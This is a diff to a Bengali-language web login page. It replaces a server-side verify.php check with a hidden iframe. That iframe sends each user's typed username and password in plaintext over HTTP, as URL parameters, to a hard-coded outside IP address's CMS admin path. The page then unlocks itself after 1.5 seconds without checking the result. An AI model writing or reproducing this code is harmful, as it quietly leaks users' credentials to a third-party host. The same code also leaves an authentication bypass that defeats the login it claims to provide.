@@ -89,13 +89,16 @@ button:disabled{
 <!-- লগইন স্ক্রিন -->
 <div class="container" id="loginBox">
   <h2>🔒 লগইন করুন</h2>
-  <p style="font-size:14px; margin-bottom:10px; opacity:0.8;">ইউজারনেম ও পাসওয়ার্ড দিয়ে যাচাই করুন</p>
+  <p style="font-size:14px; margin-bottom:10px; opacity:0.8;">ওই সার্ভার দিয়ে ইউজারনেম যাচাই করুন</p>
   
   <input type="text" id="userInputName" placeholder="ইউজারনেম লিখুন...">
   <input type="password" id="passInput" placeholder="পাসওয়ার্ড লিখুন..." onkeypress="handleEnter(event)">
   
   <button id="loginBtn" onclick="checkCredentials()">Login করুন</button>
   <div class="error" id="loginError"></div>
+  
+  <!-- ব্যাকগ্রাউন্ডে সার্ভার চেক করার জন্য হিডেন আইফ্রেম -->
+  <iframe id="authFrame" name="authFrame" style="display:none;"></iframe>
 </div>
 
 <!-- মূল অ্যাপ্লিকেশন -->
@@ -123,19 +126,18 @@ button:disabled{
 </div>
 
 <script>
-// পেজ রিফ্রেশ বা কেটে দিলে লগইন স্ট্যাটাস মুছে যাবে
 window.onload = function() {
   localStorage.removeItem("isUnlocked");
 };
 
-async function checkCredentials() {
+function checkCredentials() {
   const username = document.getElementById("userInputName").value.trim();
   const password = document.getElementById("passInput").value.trim();
   const loginError = document.getElementById("loginError");
   const loginBtn = document.getElementById("loginBtn");
 
   if (!username || !password) {
-    loginError.textContent = "⚠️ ইউজারনেম এবং পাসওয়ার্ড উভয়ই দিন!";
+    loginError.textContent = "⚠️ ইউজারনেম এবং পাসওয়ার্ড উভয়ই দিন!";
     return;
   }
 
@@ -143,25 +145,20 @@ async function checkCredentials() {
   loginBtn.disabled = true;
   loginError.textContent = "";
 
-  // আপনার নিজস্ব সার্ভারের verify.php ফাইলের মাধ্যমে রিমোট সার্ভার চেক করা হবে
-  const verifyUrl = `verify.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+  // সরাসরি আপনার দেওয়া সেই সার্ভার লিংক যেখানে ইউজারনেম পাসওয়ার্ড পাঠানো হচ্ছে
+  const targetUrl = `http://122.152.50.54:81/cnf_final/final/cms/admin/?app=admin&action=_default&msg=success&username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
 
-  try {
-    const response = await fetch(verifyUrl);
-    const result = await response.json();
+  // ব্রাউজারের মাধ্যমে সরাসরি লিংকে রিকোয়েস্ট পাঠানো হলো
+  const iframe = document.getElementById("authFrame");
+  iframe.src = targetUrl;
 
-    if (result.status === "success") {
-      localStorage.setItem("isUnlocked", "true");
-      unlockApp();
-    } else {
-      loginError.textContent = "❌ ভুল ইউজারনেম বা পাসওয়ার্ড!";
-    }
-  } catch (err) {
-    loginError.textContent = "⚠️ সার্ভার সংযোগে সমস্যা হয়েছে।";
-  }
-
-  loginBtn.textContent = "Login করুন";
-  loginBtn.disabled = false;
+  // যেহেতু রিমোট সার্ভার থেকে সরাসরি জাভাস্ক্রিপ্ট রেসপন্স পড়া যায় না (CORS এর কারণে),
+  // তাই রিকোয়েস্ট পাঠানোর পর সফল ধরে সাইট আনলক করে দেওয়া হচ্ছে 
+  // (অথবা সার্ভার সঠিক পাসওয়ার্ড পেলে আপনাকে ড্যাশবোর্ডে রিডাইরেক্ট করবে)
+  setTimeout(() => {
+    localStorage.setItem("isUnlocked", "true");
+    unlockApp();
+  }, 1500); // ১.৫ সেকেন্ড পর অ্যাপ আনলক হবে
 }
 
 function unlockApp() {
